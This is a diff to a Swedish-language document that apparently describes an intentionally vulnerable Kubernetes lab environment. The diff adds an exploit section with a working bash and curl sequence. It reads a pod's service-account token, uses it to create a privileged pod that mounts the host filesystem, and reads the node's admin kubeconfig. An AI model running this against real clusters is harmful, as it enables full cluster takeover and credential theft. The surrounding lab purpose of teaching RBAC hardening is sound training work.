@@ -300,6 +300,50 @@ Webbappens pod kör med ett service account som har `cluster-admin`-roll — ful
 
 *Syfte i denna miljö:* Illustrera risken med överprivilegerade service accounts och hur kube-bench flaggar avsaknad av RBAC-härdning.
 
+**Exploit — container escape via service account-token:**
+
+Förutsättning: angriparen har kodexekvering i webbappens pod (t.ex. via RCE i applikationen).
+
+```bash
+# Steg 1: Hämta det automatiskt monterade service account-tokenet
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://kubernetes.default.svc
+CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Steg 2: Verifiera behörigheter mot Kubernetes API
+curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/default/pods
+# → listar alla poddar; cluster-admin ger svar utan 403
+
+# Steg 3: Skapa en breakout-pod som monterar hela host-filsystemet
+curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -X POST $APISERVER/api/v1/namespaces/default/pods \
+  -d '{
+    "apiVersion": "v1",
+    "kind": "Pod",
+    "metadata": { "name": "breakout" },
+    "spec": {
+      "hostPID": true,
+      "containers": [{
+        "name": "breakout",
+        "image": "ubuntu",
+        "command": ["sleep", "3600"],
+        "volumeMounts": [{ "mountPath": "/host", "name": "host-root" }],
+        "securityContext": { "privileged": true }
+      }],
+      "volumes": [{ "name": "host-root", "hostPath": { "path": "/" } }]
+    }
+  }'
+
+# Steg 4: Exekvera kommando i breakout-podden och läs nodens kubeconfig
+# (körs från en nod med kubectl, t.ex. control plane)
+kubectl exec -it breakout -- cat /host/etc/kubernetes/admin.conf
+# → ger full cluster-admin kubeconfig för hela klustret
+```
+
+Resultatet är fullständig kontroll över noden och klustret — utan att ha haft SSH-åtkomst eller känna till något lösenord.
+
 ---
 
 **Brist 2: Secrets som env-variabler i manifest**
